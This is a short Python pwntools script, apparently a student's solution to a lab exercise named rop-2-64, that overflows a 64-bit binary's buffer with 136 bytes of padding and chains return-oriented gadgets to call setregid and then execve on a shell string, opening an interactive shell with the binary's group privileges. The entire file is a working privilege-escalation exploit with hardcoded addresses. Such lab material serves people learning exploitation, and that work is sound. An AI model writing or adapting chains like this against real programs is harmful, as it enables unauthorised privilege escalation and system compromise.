#!/usr/bin/env python
from pwn import *

offset = 136

setregid = p64(0x7ffff7afab60)
execve   = p64(0x7ffff7a33440)
pop_rdi  = p64(0x00000000004007b3)
pop_rsi  = p64(0x00000000004007b1)
pop_rdx  = p64(0x0000000000400699)
sh_addr  = p64(0x7ffff7df7ebc)

buf = 'A' * offset
buf += pop_rdi
buf += p64(1044)
buf += pop_rsi
buf += p64(1044) * 2
buf += setregid
# next
buf += pop_rdi
buf += sh_addr
buf += pop_rsi
buf += p64(0) * 2
buf += pop_rdx
buf += p64(0)
buf += execve

p = process('/home/student/lab5/rop-2-64/rop-2-64')

with open('input.txt', 'w') as f:
    f.write(buf)

p.send(buf)
p.interactive()
